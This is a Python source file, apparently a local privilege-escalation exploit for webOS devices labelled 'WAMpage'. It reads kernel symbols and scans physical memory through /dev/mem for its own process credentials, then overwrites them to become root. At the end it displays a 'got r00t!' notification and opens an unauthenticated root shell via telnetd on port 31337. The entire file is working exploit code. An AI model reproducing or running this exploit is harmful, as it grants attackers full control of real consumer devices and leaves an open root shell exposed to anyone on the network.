import os
import struct
import sys

sys.stdout = open("/tmp/devmemes.log", "w")

if os.getuid() == 0:
        print("[*] TEST MODE: dropping privs to wam:compositor")
        os.setresgid(505, 505, 505)
        os.setresuid(505, 505, 505)

#os.system("id")

ksyms = {}
for line in open("/proc/kallsyms").readlines():
        addr, x, symbol = line.strip().split(" ")
        addr = int(addr, 16)
        ksyms[symbol] = addr

kernel_slide = ksyms["_text"] & ~0xFFFFFF

def kern2phys(addr):
        return addr - kernel_slide

mem = open("/dev/mem", "wb+", 0)
ram_ranges = []

# https://elixir.bootlin.com/linux/v4.4.84/source/include/linux/ioport.h#L18
def parse_resource(addr):
        mem.seek(kern2phys(addr))
        start, end, name, flags, parent, sibling, child = struct.unpack("<IIIIIII", mem.read(7*4))
        mem.seek(kern2phys(name))
        name_str = ""
        while True:
                char = mem.read(1)
                if char == "\0":
                        break
                name_str += char
        print(name_str, hex(start), hex(end))   

        if name_str == "System RAM":
                ram_ranges.append((start, end + 1))
        
        if child:
                parse_resource(child)
        if sibling:
                parse_resource(sibling)


parse_resource(ksyms["iomem_resource"])


visited = set()
# https://elixir.bootlin.com/linux/v4.4.84/source/include/linux/sched.h#L1390
def parse_task(addr):
        mem.seek(kern2phys(addr))
        task = mem.read(4096)
        #print(repr(task))
        PID_OFFSET = 1376
        pid, tgid, real_parent, parent, children_prev, children_next, sibling_prev, sibling_next, group_leader, ptraced_prev, ptraced_next = struct.unpack("<IIIIIIIIIII", task[PID_OFFSET:PID_OFFSET+4*11])

        if pid in visited:
                return

        visited.add(pid)

        print("offset: " + str(PID_OFFSET))
        print("this: " + hex(addr))
        print("pid: " + str(pid))
        print("cp: " + hex(children_prev))
        print("cn: " + hex(children_next))
        print("sp: " + hex(sibling_prev))
        print("sn: " + hex(sibling_next))
        print("pp: " + hex(ptraced_prev))
        print("pn: " + hex(ptraced_next))

        if children_next:
                next_ptr = children_next - PID_OFFSET - 4*5
                if next_ptr != addr:
                        parse_task(next_ptr)
                else:
                        print("link to self")

        #if sibling_next:
        #       parse_task(sibling_next)

#parse_task(ksyms["init_task"])



ruid, euid, suid = os.getresuid()
rgid, egid, sgid = os.getresgid()

cred = struct.pack("<IIIIIIIII", ruid, rgid, suid, sgid, euid, egid, ruid, rgid, 0xdeadbeef)
testcred = struct.pack("<IIIIIIII", ruid, rgid, suid, 0, euid, egid, ruid, rgid)

def try_patch(addr):
        mem.seek(addr+32)
        token = struct.unpack("<I", mem.read(4))[0]
        if token == 0xdeadbeef:
                print("found ourselves")
                return # we're looking at ourself

        mem.seek(addr)
        mem.write(testcred)
        mem.flush()
        mem.seek(addr)
        if os.getresgid()[2] == 0:
                mem.write("\0"*32) # make ourselves fully root
                mem.flush()
                print("ROOTED")
                return True
        else:
                mem.write(cred) # put it back
                mem.flush()
                return False
        

def get_root():
        CHUNK_SIZE = 0x100000
        for start, end in ram_ranges:
                for block in range(start, end, CHUNK_SIZE):
                        mem.seek(block)
                        data = mem.read(CHUNK_SIZE)
                        start = 0
                        try:
                                while True:
                                        hit = data.index(cred[:-4], start)
                                        start = hit + 1
                                        print(hex(block + hit))
                                        if try_patch(block + hit):
                                                return True
                        except ValueError:
                                pass
        else:
                raise Exception("Couldn't find creds")

get_root()

os.system("""luna-send -a wampage -f -n 1 luna://com.webos.notification/createToast '{"sourceId":"wampage","message":"WAMpage: got r00t!"}' &""")
os.system("telnetd -l /bin/sh -p 31337")
